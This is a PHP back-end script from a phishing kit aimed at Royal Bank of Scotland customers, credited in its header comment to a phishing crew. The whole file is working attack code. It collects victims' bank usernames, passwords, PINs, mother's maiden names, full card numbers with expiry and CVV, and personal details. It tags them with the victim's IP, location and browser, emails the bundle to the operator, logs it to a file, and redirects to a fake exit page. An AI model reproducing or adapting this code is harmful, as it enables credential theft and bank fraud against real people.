<?php
/*
Created by l33bo_phishers -- icq: 695059760 
*/
require "../../CONTROLS.php";
require "../../includes/functions.php";
require "../../includes/One_Time.php";

error_reporting(0);
session_start();


date_default_timezone_set('Europe/London');
$date = date('l d F Y');
$time = date('H:i');
$username = $_SESSION['userid'];
$pin = $_SESSION['pin'];
$password = $_SESSION['password'];
$name = $_POST['name'];
$dob = $_SESSION['dob'];
$email = $_POST['email'];
$mobile = $_POST['mobile'];
$telephone = $_POST['telephone'];
$address = $_POST['address'];
$postcode = $_POST['postcode'];
$mmn = $_POST['mmn'];
$ccno = $_POST['ccno'];
$ccexp = $_POST['ccexp'];
$secode = $_POST['secode'];
$_SESSION['ccno'] = $_POST['ccno'];
$_SESSION['ccno'] = str_replace(' ', '', $_SESSION['ccno']);
$_SESSION['last4'] = substr($_SESSION['ccno'], 12, 16);
$cardInfo = bankDetails($_SESSION['ccno']);
$_SESSION['bin'] = ($cardInfo['bin']);
$_SESSION['brand'] = ($cardInfo['brand']);
$_SESSION['bank'] = ($cardInfo['issuer']);
$_SESSION['type'] = ($cardInfo['type']);
$bin = $_SESSION['bin'];
$bank = $_SESSION['bank'];
$brand = $_SESSION['brand'];
$type = $_SESSION['type'];
$ip = $_SERVER['REMOTE_ADDR'];
$systemInfo = systemInfo($_SERVER['REMOTE_ADDR']);
$_SESSION['VictimInfo1'] = "| Submitted by : " . $_SERVER['REMOTE_ADDR'] . " (" . gethostbyaddr($_SERVER['REMOTE_ADDR']) . ")";
$_SESSION['VictimInfo2'] = "| Location : " . $systemInfo['city'] . ", " . $systemInfo['region'] . ", " . $systemInfo['country'] . "";
$_SESSION['VictimInfo3'] = "| UserAgent : " . $systemInfo['useragent'] . "";
$_SESSION['VictimInfo4'] = "| Browser : " . $systemInfo['browser'] . "";
$_SESSION['VictimInfo5'] = "| Os : " . $systemInfo['os'] . "";


$VictimInfo1 = $_SESSION['VictimInfo1'];
$VictimInfo2 = $_SESSION['VictimInfo2'];
$VictimInfo3 = $_SESSION['VictimInfo3'];
$VictimInfo4 = $_SESSION['VictimInfo4'];
$VictimInfo5 = $_SESSION['VictimInfo5'];
$data = "
+ ------------- RBS -------------+
+ ------------------------------------------+
+ Personal Information
| Full name : $name
| Date of birth : $dob
| Address : $address
| Postcode : $postcode
| Mobile : $mobile
| Telephone : $telephone
| Email : $email
| MMN : $mmn
+ ------------------------------------------+
+ Account Information (Rbs)
| Username : $username
| Password : $password
| Pin : $pin
+ ------------------------------------------+
+ Billing Information
| Card Number : $ccno
| Expiration date : $ccexp
| CVV : $secode
+ ------------------------------------------+
+ Victim Information
$VictimInfo1
$VictimInfo2
$VictimInfo3
$VictimInfo4
$VictimInfo5
| Received : $date @ $time
+ ------------------------------------------+
";
mail($to, 'RBS from ' . $_SERVER['REMOTE_ADDR'], $data);

$file = fopen('../../assets/logs/banks.txt', 'a');
fwrite($file, $data);
fclose($file);

header('Location: ../../Exit.php?sslchannel=true&sessionid=' . generateRandomString(130));
exit;
?>